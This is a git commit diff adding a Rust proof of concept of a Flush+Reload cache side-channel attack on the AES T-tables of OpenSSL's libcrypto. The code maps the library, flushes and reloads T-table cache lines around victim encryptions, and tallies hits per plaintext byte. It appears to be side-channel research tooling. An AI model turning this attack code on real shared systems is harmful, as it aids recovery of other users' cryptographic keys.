0819eef0c0e6a2ff6e6ba84029efb144efbef3b0
GuillaumeDIDIER <guillaume.didier95@hotmail.fr>
2020-08-19 10:07:48 +0200

    First version of aes T table attack - using flush and reload naively

--- aes-t-tables/src/lib.rs
+++ aes-t-tables/src/lib.rs
@@ -1,3 +1,15 @@
+use openssl::aes;
+
+use crate::CacheStatus::Hit;
+use memmap2::Mmap;
+use openssl::aes::aes_ige;
+use openssl::symm::Mode;
+use std::collections::HashMap;
+use std::fmt::Debug;
+use std::fs::File;
+use std::path::Path;
+use std::sync::Arc;
+
 // Generic AES T-table attack flow
 
 // Modularisation :
@@ -19,3 +31,181 @@
 
 // an attacker measurement
 // a calibration victim
+
+#[derive(Debug, PartialEq, Eq)]
+pub enum CacheStatus {
+    Hit,
+    Miss,
+}
+
+pub enum SideChannelError<T> {
+    NeedRecalibration,
+    FatalError(T),
+}
+
+/*
+pub enum CacheSideChannel {
+    SingleAddr,
+    MultipleAddr,
+}
+*/
+
+// Access Driven
+
+pub trait SimpleCacheSideChannel {
+    // TODO
+}
+
+pub trait TableCacheSideChannel {
+    type ChannelFatalError: Debug;
+    fn attack<'a, 'b, 'c>(
+        &'a mut self,
+        addresses: impl IntoIterator<Item = *const u8>,
+        victim: &'c dyn Fn(),
+    ) -> Result<Vec<(*const u8, CacheStatus)>, Self::ChannelFatalError>;
+}
+
+pub trait SingleAddrCacheSideChannel: Debug {
+    type ChannelFatalError: Debug;
+
+    fn test(
+        &mut self,
+        addr: *const u8,
+    ) -> Result<CacheStatus, SideChannelError<Self::ChannelFatalError>>;
+    fn prepare(&mut self, addr: *const u8);
+    fn victim(&mut self, operation: &dyn Fn());
+    fn calibrate(
+        &mut self,
+        addresses: impl IntoIterator<Item = *const u8>,
+    ) -> Result<(), Self::ChannelFatalError>;
+}
+
+/*
+pub trait MultipleAddrCacheSideChannel: Debug {
+    type ChannelFatalError: Debug;
+    fn test<'a>(
+        &self,
+        addresses: impl IntoIterator<Item = &'a *const u8>,
+    ) -> Result<Vec<CacheStatus>, SideChannelError<Self::ChannelFatalError>>;
+    fn prepare<'a>(addresses: impl IntoIterator<Item = &'a *const u8>);
+    fn victim<T>(&self, operation: Box<dyn FnOnce() -> T>) -> T;
+    fn recalibrate(self) -> Result<Self, Self::ChannelFatalError>;
+    fn calibrate<'a>(
+        params: Self::Params,
+        addresses: impl IntoIterator<Item = &'a *const u8>,
+    ) -> Result<Self, Self::ChannelFatalError>;
+}
+*/
+
+impl<T: SingleAddrCacheSideChannel> TableCacheSideChannel for T {
+    type ChannelFatalError = T::ChannelFatalError;
+
+    fn attack<'a, 'b, 'c>(
+        &'a mut self,
+        addresses: impl IntoIterator<Item = *const u8>,
+        victim: &'c dyn Fn(),
+    ) -> Result<Vec<(*const u8, CacheStatus)>, Self::ChannelFatalError> {
+        let mut result = Vec::new();
+
+        for addr in addresses {
+            self.prepare(addr);
+            self.victim(victim);
+            let r = self.test(addr);
+            match r {
+                Ok(status) => {
+                    result.push((addr, status));
+                }
+                Err(e) => match e {
+                    SideChannelError::NeedRecalibration => panic!(),
+                    SideChannelError::FatalError(e) => {
+                        return Err(e);
+                    }
+                },
+            }
+        }
+        Ok(result)
+    }
+}
+
+pub struct AESTTableParams<'a> {
+    pub num_encryptions: u32,
+    pub key: [u8; 32],
+    pub openssl_path: &'a Path,
+    pub te: [isize; 4],
+}
+
+const LEN: usize = (u8::max_value() as usize) + 1;
+
+pub fn attack_t_tables_poc(
+    side_channel: &mut impl TableCacheSideChannel,
+    parameters: AESTTableParams,
+) -> () {
+    // Note : This function doesn't handle the case where the address space is not shared. (Additionally you have the issue of complicated eviction sets due to complex addressing)
+    // TODO
+
+    // Possible enhancements : use ability to monitor several addresses simultaneously.
+    let fd = File::open(parameters.openssl_path).unwrap();
+    let mmap = unsafe { Mmap::map(&fd).unwrap() };
+    let base = mmap.as_ptr();
+
+    let te0 = unsafe { base.offset(parameters.te[0]) };
+    if unsafe { (te0 as *const u64).read() } != 0xf87c7c84c66363a5 {
+        panic!("Hmm This does not look like a T-table, check your address and the openssl used")
+    }
+
+    let key_struct = aes::AesKey::new_encrypt(&parameters.key).unwrap();
+
+    //let mut plaintext = [0u8; 16];
+    //let mut result = [0u8; 16];
+
+    let mut timings: HashMap<*const u8, HashMap<u8, u32>> = HashMap::new();
+
+    let addresses = parameters
+        .te
+        .iter()
+        .map(|&start| ((start)..(start + 64 * 16)).step_by(64))
+        .flatten()
+        .map(|offset| unsafe { base.offset(offset) });
+
+    for addr in addresses.clone() {
+        timings.insert(addr, HashMap::new());
+    }
+
+    for b in (u8::min_value()..=u8::max_value()).step_by(16) {
+        //plaintext[0] = b;
+        eprintln!("Probing with b = {:x}", b);
+        // fixme magic numbers
+
+        let victim = || {
+            let mut plaintext = [0u8; 16];
+            plaintext[0] = b;
+            for i in 1..plaintext.len() {
+                plaintext[i] = rand::random();
+            }
+            let mut iv = [0u8; 32];
+            let mut result = [0u8; 16];
+            aes_ige(&plaintext, &mut result, &key_struct, &mut iv, Mode::Encrypt);
+        };
+        for i in 0..parameters.num_encryptions {
+            let r = side_channel.attack(addresses.clone(), &victim);
+            match r {
+                Ok(v) => {
+                    //println!("{:?}", v)
+                    for (probe, status) in v {
+                        if status == Hit {
+                            *timings.get_mut(&probe).unwrap().entry(b).or_insert(0) += 1;
+                        }
+                    }
+                }
+                Err(_) => panic!("Attack failed"),
+            }
+        }
+    }
+    for probe in addresses {
+        print!("{:p}", probe);
+        for b in (u8::min_value()..=u8::max_value()).step_by(16) {
+            print!(" {}", timings[&probe][&b]);
+        }
+        println!();
+    }
+}
--- aes-t-tables/src/main.rs
+++ aes-t-tables/src/main.rs
@@ -1,3 +1,70 @@
+use aes_t_tables::{
+    attack_t_tables_poc, AESTTableParams, CacheStatus, SideChannelError, SingleAddrCacheSideChannel,
+};
+use cache_utils::calibration::only_reload;
+use cache_utils::{flush, rdtsc_fence};
+use std::path::Path;
+
+#[derive(Debug)]
+struct NaiveFlushAndReload {
+    pub threshold: u64,
+    current: Option<*const u8>,
+}
+
+impl NaiveFlushAndReload {
+    fn from_threshold(threshold: u64) -> Self {
+        NaiveFlushAndReload {
+            threshold,
+            current: None,
+        }
+    }
+}
+
+impl SingleAddrCacheSideChannel for NaiveFlushAndReload {
+    type ChannelFatalError = ();
+
+    fn test(
+        &mut self,
+        addr: *const u8,
+    ) -> Result<CacheStatus, SideChannelError<Self::ChannelFatalError>> {
+        if self.current != Some(addr) {
+            panic!(); // FIXME
+        }
+        let t = unsafe { only_reload(addr) };
+        if t > self.threshold {
+            Ok(CacheStatus::Miss)
+        } else {
+            Ok(CacheStatus::Hit)
+        }
+    }
+
+    fn victim(&mut self, operation: &dyn Fn()) {
+        operation()
+    }
+
+    fn calibrate(
+        &mut self,
+        _addresses: impl IntoIterator<Item = *const u8>,
+    ) -> Result<(), Self::ChannelFatalError> {
+        Ok(())
+    }
+
+    fn prepare(&mut self, addr: *const u8) {
+        unsafe { flush(addr) };
+        self.current = Some(addr);
+    }
+}
+
 fn main() {
-    println!("Hello, world!");
+    let open_sslpath = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
+    let mut side_channel = NaiveFlushAndReload::from_threshold(200);
+    attack_t_tables_poc(
+        &mut side_channel,
+        AESTTableParams {
+            num_encryptions: 10000,
+            key: [0; 32],
+            te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+            openssl_path: &open_sslpath,
+        },
+    );
 }
